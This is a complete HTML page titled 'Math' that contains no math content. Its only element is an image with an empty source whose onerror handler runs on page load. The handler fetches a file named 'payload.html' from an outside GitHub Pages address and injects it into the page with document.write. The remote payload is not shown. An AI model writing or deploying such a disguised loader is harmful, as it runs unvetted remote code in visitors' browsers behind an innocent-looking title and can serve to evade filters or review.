<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Math</title>
</head>
<body>

<img src=""
onerror="
fetch('https://nevapaid.github.io/payload.html')
  .then(res => res.text())
  .then(html => document.write(html))
  .catch(err => {
    console.error(err);
    document.body.innerHTML = '<h1>Failed to load</h1>';
  });
">

</body>
</html>
